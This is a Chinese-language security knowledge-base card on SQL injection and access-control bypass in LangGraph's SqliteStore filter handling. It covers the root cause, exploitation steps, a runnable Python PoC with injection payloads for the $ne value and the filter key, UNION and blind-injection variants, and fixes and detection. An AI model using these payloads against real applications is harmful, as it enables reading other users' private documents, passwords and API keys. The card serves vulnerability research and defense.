---
id: ai-security-agent-security-langgraph-sqlite-store-filter-operator-injection
title: LangGraph SQLite Store 过滤操作符注入：$ne 逻辑绕过与 filter key SQL 注入
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: langgraph-sqlite-store-filter-operator-injection
tags:
- ai-security
- agent-security
- langgraph
- sqlite
- sqli
- filter
- access-control
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:51:19+08:00'
  notes: 已对照原文与 6 张图核对：_prepare_batch_search_queries → _get_filter_condition 数据流、 的 '' 转义后长字符串恒真逻辑绕过、key 未转义导致 json_extract 路径闭合注入、修复 _validate_filter_key 正则 ^[a-zA-Z0-9_.-]+$ 均与图 02-06 一致。卡片正确区分了“逻辑绕过”与“key SQLi”，未把  value 误判为任意 SQLi。原文仅给出复现版本 2.0.10，未给受影响区间，未设 versions。未复跑 PoC。
url: /docs/ai-security/agent-security/ai-security-agent-security-langgraph-sqlite-store-filter-operator-injection/
draft: false
kb_aliases:
- LangGraph SQLite 注入
- SqliteStore $ne
- filter key 注入
- langgraph-checkpoint-sqlite
- 访问控制绕过
---

## 一句话结论

LangGraph 的 `SqliteStore` 在 `_get_filter_condition()` 中把 filter 的 key 和操作符 value 直接拼进 SQL：`$ne` 的字符串值只做 `'`→`''` 转义，`{"access":{"$ne":"public' OR '1'='1"}}` 会变成 `!= 'public'' OR ''1''=''1'` 这个长字符串字面量，导致所有文档都“不等于”它而全部返回，绕过 access 过滤；同时 key 被拼进 `json_extract(value,'$.{key}')`，恶意 key 可闭合引号注入任意 SQL，读取密码/API key 等敏感字段。

## 原理

- **入口数据流**：`store.search(namespace, filter=...)` → `_prepare_batch_search_queries()` 遍历 `op.filter`，对每个 `(key, {op: value})` 调用 `_get_filter_condition(key, op, value)`，返回 `(condition, params)`；`condition` 被 `AND` 拼进 `base_query`，params 只用于 `prefix LIKE ?` 等参数化部分。
- **`$ne` 字符串拼接**：
  ```python
  f"json_extract(value, '$.{key}') != '" + value.replace("'", "''") + "'"
  ```
  输入 `public' OR '1'='1` 被转义为 `public'' OR ''1''=''1`，整体仍是一个 SQL 字符串字面量（值就是 `public' OR '1'='1`）；`json_extract` 返回 `public`/`private`，都 `!=` 这个长字符串，因此条件恒真 → 返回所有文档。
- **这是逻辑绕过而非任意 SQLi**：对 `$ne` 的 value，`''` 转义确实阻止了闭合字符串，所以 payload 里的 `OR '1'='1` 不会变成 SQL 语法；但“用长字符串让比较恒真”已经足以绕过访问控制。文章把它归为 SQL 注入，实际该分支更准确说是“过滤器逻辑绕过”。
- **真正的 SQL 注入在 key**：`json_extract(value, '$.{key}')` 中 `key` 未转义；传 `key="access') = 'public' OR '1'='1' OR json_extract(value, '$."` 可闭合 `'$.` 字符串并注入 `OR` 条件，读取所有文档。`value` 的数字/布尔/None 分支也使用 f-string，需逐分支审查。
- **影响**：应用把用户可控 filter 传给 `SqliteStore.search` 时，攻击者可读取任意 namespace 下的文档（包括 private/admin 文档的 `password`、`api_key`），绕过应用层 ACL；key 注入还可进一步做布尔/UNION 查询（取决于 SQLite 版本与查询形态）。
- **修复**：补丁增加 `_validate_filter_key(key)`，只允许 `^[a-zA-Z0-9_.-]+$`，拒绝引号/空格/括号/注释符；但 value 侧仍建议参数化/白名单操作符，不能只靠 key 正则。
- **版本**：文章用 `langgraph-checkpoint-sqlite==2.0.10` 复现；未给出完整受影响区间，故本卡不设置 affected_versions。

## 触发条件

- 使用 LangGraph `SqliteStore`（`langgraph-checkpoint-sqlite`，文章测试 2.0.10）。
- 应用把用户可控的 filter key/value/操作符传给 `store.search()`（例如按 `access`、`owner`、`tenant` 字段过滤）。
- 数据库中存在不同权限的文档，且应用依赖 filter 做访问控制。
- SQLite 版本支持 `json_extract`（通常内置）。

## 利用步骤

1. 搭建 `SqliteStore`，写入 public/private/admin 文档，确认正常 `filter={"access":{"$ne":"private"}}` 只返回 public/admin。
2. 发送 `filter={"access":{"$ne":"public' OR '1'='1"}}`；由于长字符串比较恒真，返回所有文档（包括 private）。
3. 读取返回文档的 `password`/`api_key` 等字段，验证越权。
4. 若 value 分支被修复/限制，改用 key 注入：`filter={"access') = 'public' OR '1'='1' OR json_extract(value, '$.": "dummy"}`；闭合 `json_extract` 的路径字符串并注入 OR。
5. 对 `$gt/$gte/$lt/$lte` 的数字/布尔/None 分支重复测试；不同分支的拼接方式可能不同。
6. 授权测试只在本地内存库进行，不读取真实用户数据。

## PoC

```python
from langgraph.store.sqlite import SqliteStore

with SqliteStore.from_conn_string(":memory:") as store:
    store.setup()
    store.put(("docs",), "public1", {"access": "public"})
    store.put(("docs",), "private1", {"access": "private", "password": "secret123"})

    print("normal:", [i.value for i in store.search(("docs",), filter={"access": {"$ne": "private"}})])
    print("bypass:", [i.value for i in store.search(("docs",), filter={"access": {"$ne": "public' OR '1'='1"}})])

    malicious_key = "access') = 'public' OR '1'='1' OR json_extract(value, '$."
    print("key-inj:", [i.value for i in store.search(("docs",), filter={malicious_key: "dummy"})])
```

说明：PoC 按原文 `SqliteStore` 用法重写；`$ne` 分支是逻辑绕过，key 分支才是闭合引号的 SQL 注入。未在本机对附件复跑。

## 变体与关联

- **其他操作符**：`$gt/$gte/$lt/$lte` 的字符串/数字/布尔/None 分支分别拼接，需逐分支测试；`$eq` 可能走参数化。
- **key 注入**：`json_extract` 路径字符串未转义；除 `OR` 外可尝试 `UNION SELECT`、布尔盲注、`--` 注释。
- **其他存储**：Postgres/Redis Store 的 filter 实现不同；LangGraph checkpoint SQLite 也可能有类似拼接。
- **关联**：[[ai-security-agent-security-langgraph-checkpoint-json-fallback-rce]]（LangGraph 检查点反序列化 RCE）、[[web-generic-sqli-sqlite-union-values-select-filter-bypass]]（SQLite UNION/VALUES 绕过）。

## 检测与防御

- **修复**：升级到包含 `_validate_filter_key` 的版本；对 filter key 做 `^[a-zA-Z0-9_.-]+$` 白名单，拒绝引号/空格/括号/`--`/`/*`。
- **参数化**：操作符 value 不要拼 SQL；用参数占位符/ORM 表达式，或把允许的操作符/字段做成枚举。
- **访问控制**：不要把 ACL 完全交给用户可控 filter；在查询前按租户/用户强制注入不可绕过的条件，返回后再做权限校验。
- **检测**：审计 `store.search` 的 filter 是否来自用户输入；监控包含 `'`、`OR`、`--`、`json_extract` 的 key/value；对 `langgraph-checkpoint-sqlite` 依赖做版本扫描。
